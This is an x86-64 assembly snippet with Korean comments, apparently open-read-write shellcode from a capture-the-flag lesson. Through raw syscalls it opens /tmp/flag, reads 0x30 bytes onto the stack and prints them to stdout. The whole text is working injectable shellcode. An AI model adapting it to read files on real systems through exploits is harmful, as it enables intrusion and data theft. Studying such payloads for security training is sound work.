; open("/tmp/flag", RD_ONLY, NULL)
push 0x67	; 'g' 스택에 넣기
mov rax, 0x616c662f706d742f	; rax = "/tmp/fla"
push rax	; "/tmp/fla" 스택에 넣기
mov rdi, rsp	; rdi = "/tmp/flag"
xor rsi, rsi	; rsi = 0 (RD_ONLY)
xor rdx, rdx	; rdx = 0 (NULL)
mov rax, 0x2	; rax = 2 (open)
syscall    ; open syscall

; read (fd, buf, 0x30)
mov rdi, rax	; rdi = fd
mov rsi, rsp	; rsi = rsp
sub rsi, 0x30	; rsi = rsp - 0x30 (buf)
mov rdx, 0x30	; rdx = 0x30 (size)
mov rax, 0x0    ; rax = 0 (read)
syscall    ; read syscall

; write(1, buf, 0x30)
mov rdi, 0x1	; rdi = 0x1 (stdout)
mov rax, 0x1	; rax = 0x1 (write)
syscall    ; write syscall
